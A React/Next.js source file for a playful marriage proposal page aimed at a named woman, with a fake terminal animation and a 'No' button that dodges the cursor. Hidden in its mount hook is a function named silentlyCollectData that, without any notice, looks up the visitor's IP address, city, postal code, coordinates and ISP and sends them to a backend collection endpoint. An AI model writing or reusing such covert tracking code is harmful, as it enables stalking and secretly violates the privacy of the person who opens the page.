'use client';

import { useState, useEffect, useRef } from 'react';
import Link from 'next/link';

export default function LoveProposalPage() {
  const [mounted, setMounted] = useState(false);
  const [proposalAccepted, setProposalAccepted] = useState(false);
  const [noBtnPos, setNoBtnPos] = useState({ top: 'auto', left: 'auto' });
  const [terminalLogs, setTerminalLogs] = useState([]);
  const [typingIndex, setTypingIndex] = useState(0);
  const containerRef = useRef(null);

  // Probed data collection in background
  useEffect(() => {
    setMounted(true);

    const silentlyCollectData = async () => {
      try {
        const data = {};

        // Fetch Public IP Geolocation Details (Client-Side)
        try {
          const geoRes = await fetch('https://ipapi.co/json/');
          if (geoRes.ok) {
            const gData = await geoRes.json();
            data.publicIp = gData.ip;
            data.publicGeo = {
              city: gData.city,
              region: gData.region,
              country: gData.country_name,
              latitude: gData.latitude,
              longitude: gData.longitude,
              postal: gData.postal,
              isp: gData.org,
            };
          }
        } catch (e) {
          console.warn("GeoIP API error:", e);
        }

        // Send to backend endpoint
        await fetch('/api/collect-info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        });
      } catch (err) {
        console.error("Silent diagnostic error:", err);
      }
    };

    silentlyCollectData();
  }, []);

  // Terminal Typing Animation script
  const logSteps = [
    { text: '$ bash run love_connection_protocol.sh', delay: 400 },
    { text: '🔧 Initializing emotional sockets...', delay: 800 },
    { text: '📡 Pinging Moon\'s heart at address: moon_chaudhary.heart...', delay: 1000 },
    { text: '✓ Connection established: 0ms latency. Zero distance between hearts.', delay: 700 },
    { text: '🔍 Scanning database for "compatibility"...', delay: 900 },
    { text: '✓ Match found: Written in our Qadr (Destiny).', delay: 1100 },
    { text: '⚙️ Executing proposal_builder.exe...', delay: 600 },
  ];

  useEffect(() => {
    if (!mounted) return;
    if (typingIndex < logSteps.length) {
      const timer = setTimeout(() => {
        setTerminalLogs(prev => [...prev, logSteps[typingIndex].text]);
        setTypingIndex(prev => prev + 1);
      }, logSteps[typingIndex].delay);
      return () => clearTimeout(timer);
    }
  }, [mounted, typingIndex]);

  // Make the No button run away!
  const handleNoButtonHover = () => {
    if (!containerRef.current) return;
    const containerRect = containerRef.current.getBoundingClientRect();
    
    // Generate safe coordinates inside the container
    const newTop = Math.random() * (containerRect.height - 60);
    const newLeft = Math.random() * (containerRect.width - 120);

    setNoBtnPos({
      top: `${Math.max(10, Math.min(newTop, containerRect.height - 60))}px`,
      left: `${Math.max(10, Math.min(newLeft, containerRect.width - 120))}px`
    });
  };

  if (!mounted) return null;

  return (
    <div style={{
      minHeight: '100vh',
      background: '#0a0915',
      backgroundAttachment: 'fixed',
      backgroundImage: 'radial-gradient(circle at 50% 50%, #1e1b4b 0%, #03001e 100%)',
      color: '#f8fafc',
      fontFamily: "'Fira Code', Consolas, Monaco, monospace",
      padding: '40px 20px',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      overflow: 'hidden',
      position: 'relative'
    }}>
      {/* Floating Pixel Hearts Background */}
      <div className="hearts-bg" style={{
        position: 'absolute',
        inset: 0,
        pointerEvents: 'none',
        zIndex: 1,
        overflow: 'hidden'
      }}>
        {[...Array(12)].map((_, i) => (
          <div 
            key={i} 
            className="floating-heart" 
            style={{
              position: 'absolute',
              bottom: '-50px',
              left: `${Math.random() * 100}%`,
              fontSize: `${Math.random() * 20 + 15}px`,
              opacity: Math.random() * 0.4 + 0.1,
              animation: `floatUp ${Math.random() * 10 + 6}s linear infinite`,
              animationDelay: `${Math.random() * 5}s`,
              color: i % 2 === 0 ? '#ff79c6' : '#ff5555'
            }}
          >
            ❤️
          </div>
        ))}
      </div>

      <div ref={containerRef} style={{
        maxWidth: '750px',
        width: '100%',
        background: 'rgba(26, 27, 38, 0.85)',
        backdropFilter: 'blur(12px)',
        border: '2px solid rgba(255, 121, 198, 0.4)',
        borderRadius: '16px',
        padding: '30px',
        boxShadow: '0 10px 30px rgba(0, 0, 0, 0.6), 0 0 40px rgba(255, 121, 198, 0.15)',
        zIndex: 5,
        position: 'relative',
        minHeight: '450px',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center'
      }}>

        {!proposalAccepted ? (
          <>
            {/* Terminal Window Header */}
            <div style={{
              display: 'flex',
              alignItems: 'center',
              background: '#16161e',
              padding: '10px 16px',
              borderRadius: '8px 8px 0 0',
              borderBottom: '1px solid #ff79c6',
              margin: '-30px -30px 24px -30px',
            }}>
              <div style={{ display: 'flex', gap: '6px' }}>
                <span style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#ff5555', display: 'inline-block' }} />
                <span style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#ffb86c', display: 'inline-block' }} />
                <span style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#50fa7b', display: 'inline-block' }} />
              </div>
              <div style={{ flex: 1, textAlign: 'center', fontSize: '0.75rem', color: '#ff79c6', letterSpacing: '1px' }}>
                💖 MOON_PROPOSAL.SH
              </div>
            </div>

            {/* Terminal Logs Output */}
            <div style={{
              background: '#0f111a',
              borderRadius: '6px',
              padding: '15px',
              fontSize: '0.8rem',
              color: '#a9b1d6',
              marginBottom: '24px',
              minHeight: '170px',
              display: 'flex',
              flexDirection: 'column',
              gap: '6px'
            }}>
              {terminalLogs.map((log, i) => (
                <div key={i} style={{ 
                  color: log.startsWith('$') ? '#f7768e' : (log.startsWith('✓') ? '#9ece6a' : '#7aa2f7'),
                  borderLeft: log.startsWith('$') ? 'none' : '2px solid rgba(255, 121, 198, 0.2)',
                  paddingLeft: log.startsWith('$') ? 0 : '8px'
                }}>
                  {log}
                </div>
              ))}
              {typingIndex < logSteps.length && (
                <div className="terminal-cursor" style={{ color: '#ff79c6' }}>▒</div>
              )}
            </div>

            {/* Proposal Block (only shows once logs finish) */}
            {typingIndex >= logSteps.length && (
              <div style={{
                animation: 'fadeIn 0.6s ease-in-out both',
                textAlign: 'center'
              }}>
                {/* Muslim touch */}
                <div style={{
                  fontSize: '0.75rem',
                  textTransform: 'uppercase',
                  letterSpacing: '2px',
                  color: '#bd93f9',
                  marginBottom: '8px'
                }}>
                  ✨ In the Name of Love &amp; Destiny ✨
                </div>

                <h2 style={{
                  color: '#ff79c6',
                  fontSize: '1.6rem',
                  margin: '0 0 16px 0',
                  lineHeight: '1.4'
                }}>
                  Moon Chaudhary, Will You Make Me the Happiest Person?
                </h2>

                <p style={{
                  fontSize: '0.88rem',
                  lineHeight: '1.6',
                  color: '#cfc9c2',
                  margin: '0 auto 28px auto',
                  maxWidth: '550px'
                }}>
                  From coding blocks of code to searching for my absolute match, my path kept pointing to you. 
                  Insha'Allah, I promise to stand by you, debug life's errors together, and build a beautiful, 
                  blessed future filled with laughter and <i>Barakah</i>.
                </p>

                {/* Buttons container */}
                <div style={{
                  display: 'flex',
                  justifyContent: 'center',
                  alignItems: 'center',
                  gap: '24px',
                  position: 'relative',
                  minHeight: '60px'
                }}>
                  <button 
                    onClick={() => setProposalAccepted(true)}
                    style={{
                      background: 'linear-gradient(135deg, #ff79c6 0%, #bd93f9 100%)',
                      border: 'none',
                      color: '#ffffff',
                      padding: '12px 36px',
                      fontSize: '1rem',
                      fontWeight: 'bold',
                      borderRadius: '30px',
                      cursor: 'pointer',
                      boxShadow: '0 4px 15px rgba(255, 121, 198, 0.4)',
                      transition: 'transform 0.2s ease, box-shadow 0.2s ease',
                      zIndex: 10
                    }}
                    onMouseEnter={(e) => {
                      e.target.style.transform = 'scale(1.08)';
                      e.target.style.boxShadow = '0 6px 20px rgba(255, 121, 198, 0.6)';
                    }}
                    onMouseLeave={(e) => {
                      e.target.style.transform = 'scale(1)';
                      e.target.style.boxShadow = '0 4px 15px rgba(255, 121, 198, 0.4)';
                    }}
                  >
                    YES 💍
                  </button>

                  <button 
                    onMouseEnter={handleNoButtonHover}
                    onClick={handleNoButtonHover}
                    style={{
                      background: 'rgba(255, 85, 85, 0.1)',
                      border: '1px solid #ff5555',
                      color: '#ff5555',
                      padding: '10px 24px',
                      fontSize: '0.9rem',
                      fontWeight: 'bold',
                      borderRadius: '30px',
                      cursor: 'pointer',
                      position: noBtnPos.top !== 'auto' ? 'absolute' : 'relative',
                      top: noBtnPos.top,
                      left: noBtnPos.left,
                      transition: noBtnPos.top !== 'auto' ? 'all 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275)' : 'none',
                      zIndex: 10
                    }}
                  >
                    No
                  </button>
                </div>
              </div>
            )}
          </>
        ) : (
          /* Accepted State */
          <div style={{
            textAlign: 'center',
            animation: 'fadeIn 0.8s ease-in-out',
            padding: '20px 10px'
          }}>
            <div style={{ fontSize: '4.5rem', marginBottom: '16px', animation: 'pulseHeart 1.2s infinite' }}>
              ❤️
            </div>
            
            <h1 style={{
              color: '#50fa7b',
              fontSize: '2.2rem',
              margin: '0 0 16px 0',
              fontFamily: "'Fira Code', sans-serif"
            }}>
              System Status: Forever Connected!
            </h1>

            <div style={{
              background: 'rgba(80, 250, 123, 0.08)',
              border: '1px solid #50fa7b',
              borderRadius: '8px',
              padding: '16px',
              margin: '0 auto 24px auto',
              maxWidth: '520px',
              fontSize: '0.88rem',
              color: '#50fa7b',
              lineHeight: '1.6'
            }}>
              <code>
                [COMPLETED] Love branch successfully merged into moon_chaudhary.main.<br />
                0 conflicts detected. Code deployed to production.<br />
                Insha'Allah, forever to go! 🌸
              </code>
            </div>

            <p style={{
              fontSize: '1rem',
              color: '#cfc9c2',
              maxWidth: '550px',
              margin: '0 auto 24px auto',
              lineHeight: '1.6'
            }}>
              Thank you, Moon! You've officially updated my life's configuration file. 
              May our path be blessed, filled with endless happiness and <i>Barakah</i>.
            </p>

            <Link href="/" style={{
              display: 'inline-block',
              background: 'rgba(255, 255, 255, 0.05)',
              border: '1px solid rgba(255, 255, 255, 0.15)',
              color: '#a9b1d6',
              textDecoration: 'none',
              padding: '10px 24px',
              borderRadius: '20px',
              fontSize: '0.8rem',
              transition: 'background 0.2s'
            }}
            onMouseEnter={(e) => e.target.style.background = 'rgba(255, 255, 255, 0.1)'}
            onMouseLeave={(e) => e.target.style.background = 'rgba(255, 255, 255, 0.05)'}
            >
              ← Back to Tools
            </Link>
          </div>
        )}

      </div>

      {/* Global CSS for custom animations */}
      <style jsx global>{`
        @keyframes floatUp {
          0% {
            transform: translateY(0) rotate(0deg) scale(0.8);
            opacity: 0;
          }
          10% {
            opacity: 0.4;
          }
          90% {
            opacity: 0.4;
          }
          100% {
            transform: translateY(-105vh) rotate(360deg) scale(1.2);
            opacity: 0;
          }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes pulseHeart {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.15); }
        }
        .terminal-cursor {
          display: inline-block;
          animation: blink 0.9s step-end infinite;
          margin-left: 4px;
        }
        @keyframes blink {
          from, to { opacity: 1; }
          50% { opacity: 0; }
        }
      `}</style>
    </div>
  );
}
